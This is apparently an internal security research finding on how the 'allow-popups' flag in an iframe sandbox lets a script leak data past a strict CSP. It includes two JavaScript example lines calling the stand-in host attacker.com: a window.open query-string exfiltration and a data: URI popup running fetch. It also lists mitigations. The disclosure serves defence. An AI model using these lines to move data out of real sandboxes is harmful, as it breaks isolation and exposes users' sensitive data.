# Research 11: Popup Exfiltration

## Summary

This research investigates the risks associated with the `allow-popups` flag in the `iframe-sandbox` configuration. We confirmed that a sandboxed script can exfiltrate data by opening a new window to an attacker-controlled domain, effectively bypassing the network isolation intended by the CSP.

## Findings

### 1. Data Exfiltration via URL Parameters (Confirmed)

The sandbox configuration includes `allow-popups`, which permits the use of `window.open()`. Even though the sandbox uses a strict CSP to block direct network requests (`fetch`, `XHR`) to unauthorized domains, it does not prevent the creation of new top-level browsing contexts.

**Exploit:**
```javascript
const secret = "SENSITIVE_DATA";
window.open("http://attacker.com/?leak=" + secret);
```

**Result:**
The browser opens a new tab to `http://attacker.com`. The sensitive data is passed in the query string. The attacker's server logs the request, completing the exfiltration.

### 2. CSP Bypass via Data URI (Mitigated)

We attempted to bypass CSP by opening a popup with a `data:` URI containing malicious code:
```javascript
window.open("data:text/html,<script>fetch('http://attacker.com')</script>");
```

**Result:**
Modern browsers (Chromium) block navigation to `data:` URIs from sandboxed iframes. The popup opens as `about:blank` and the malicious code does not execute. This vector is mitigated by browser security defaults.

## Impact

**Medium**.
While the "Firewall" (CSP) successfully prevents direct connections from within the sandbox, the ability to open popups provides a trivial side-channel for data exfiltration. If the sandbox processes sensitive data that must not leave the environment, `allow-popups` is a significant vulnerability.

## Mitigation

1.  **Remove `allow-popups`**: If popups are not a core requirement, remove this flag from the `sandbox` attribute in `SafeSandbox.ts`.
2.  **CSP `navigate-to` (Future)**: The `navigate-to` CSP directive could restrict valid targets for navigation, but browser support is currently limited.
3.  **Popup Blocker**: Relying on the browser's popup blocker is insufficient as it can be disabled by users or bypassed (e.g., via clickjacking or if the code execution is triggered by a click).
